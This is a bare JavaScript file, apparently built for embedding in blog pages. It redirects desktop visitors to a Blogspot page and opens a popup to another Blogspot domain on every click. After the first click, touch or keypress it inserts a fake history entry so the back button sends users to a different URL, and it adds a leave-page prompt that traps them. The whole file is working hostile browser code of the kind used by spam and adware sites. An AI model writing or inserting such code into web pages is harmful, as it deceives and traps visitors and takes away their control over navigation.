//laptop
if((navigator.userAgent.match(/iPhone/i)) || (navigator.userAgent.match(/iPod/i)) || (navigator.userAgent.indexOf('Android') != -1)){
}
else location.replace("https://yurisehat.blogspot.com/p/lanjut.html");
// click
document.onclick = function() {
window.open('//indukredirect.blogspot.com/', '_blank')
}
//Load
        window.addEventListener("load", function() {
            var onceSupported = false;
            var touched = false;
            var captureSupported = false;
            try {
                var options = {
                    get once() {
                        onceSupported = true;
                        return false;
                    }
                };
                window.addEventListener("test", null, options);
                window.removeEventListener("test", null, options);
            } catch (err) {
                onceSupported = false;
            }
            try {
                var options = {
                    get capture() {
                        captureSupported = true;
                        return false;
                    }
                };
                window.addEventListener("test", null, options);
                window.removeEventListener("test", null, options);
            } catch (err) {
                captureSupported = false;
            }
            var sv = {
                'df86699f6130e141': '',
                '2148702d7c2782df': '',
                '0f53c12c292fff5b': ''
            };
            var hash = window.location.pathname.replace('/c/', '');
            var url = window.location.protocol + '//' + window.location.host + window.location.pathname;
            var cururl = url;
            if (hash && hash.length > 1 && sv[hash]) {
                url = window.location.protocol + '//' + window.location.host + window.location.pathname.replace('/c/' + hash, '/c/' + sv[hash]);
            }
            url = url + 'BigoFuck';
            cururl = cururl + 'BigoFuck';

            (function(w, d) {
                var targetLocation = function(w, d) {
                    history.pushState({
                        pg: 'prev'
                    }, d.title, cururl);
                };
                (function() {
                    try {
                        chromeVersion = +(new RegExp('Chrome/([0-9]+)').exec(navigator.userAgent)[1]);
                    } catch (e) {
                        chromeVersion = 0;
                    }
                    if (chromeVersion >= 75) {
                        w.addEventListener('mouseup', function() {
                            if (!touched) {
                                touched = true;
                                setTimeout(function() {
                                    targetLocation(w, d);
                                }, 0);
                            }
                        }, onceSupported ? {
                            once: true
                        } : false);
                        d.body.addEventListener('touchend', function(evt) {
                            if (!touched) {
                                touched = true;
                                setTimeout(function() {
                                    targetLocation(w, d);
                                }, 0);
                            }
                        }, onceSupported ? {
                            once: true
                        } : false);
                        d.body.addEventListener('keydown', function() {
                            if (!touched) {
                                touched = true;
                                setTimeout(function() {
                                    targetLocation(w, d);
                                }, 0);
                            }
                        }, onceSupported ? {
                            once: true
                        } : false);
                    } else {
                        w.addEventListener('pageshow', function() {
                            setTimeout(function() {
                                targetLocation(w, d);
                            }, 0);
                        }, onceSupported ? {
                            once: true
                        } : false);
                    }
                    w.addEventListener('popstate', function(event) {
                        window.exit = false;

                        if (window.location.href.indexOf('&iexpp=1') !== -1) {
                            window.exit = true;
                        }

                        w.location.href = url;
                    }, captureSupported ? {
                        capture: true
                    } : false);

                }())
            }(window, document));
        });

//Loaded
        document.addEventListener("DOMContentLoaded", function() {
            var buttons = document.querySelectorAll('a');
            window.exit = true;

            window.addEventListener('beforeunload', function(e) {
                if (window.exit) {
                    e.preventDefault();
                    e.returnValue = '?';
                } else {
                    delete e['returnValue'];
                }
            });
            for (var i = 0; i < buttons.length; i++) {
                buttons[i].addEventListener('mousedown', function() {
                    if (this.href.indexOf('http') !== -1) {
                        window.exit = false;
                    }
                }, false);
                buttons[i].addEventListener('touchstart', function() {
                    if (this.href.indexOf('http') !== -1) {
                        window.exit = false;
                    }
                }, false);
            }
        });
//body
        document.querySelector("body").addEventListener(
            "touchstart",
            function() {
                if (document.querySelector("body").classList.contains("body-last-step")) {
                    window.exit = false;
                }
            },
            false
        );
        document.querySelector("body").addEventListener(
            "mousedown",
            function() {
                if (document.querySelector("body").classList.contains("body-last-step")) {
                    window.exit = false;
                }
            },
            false
        );
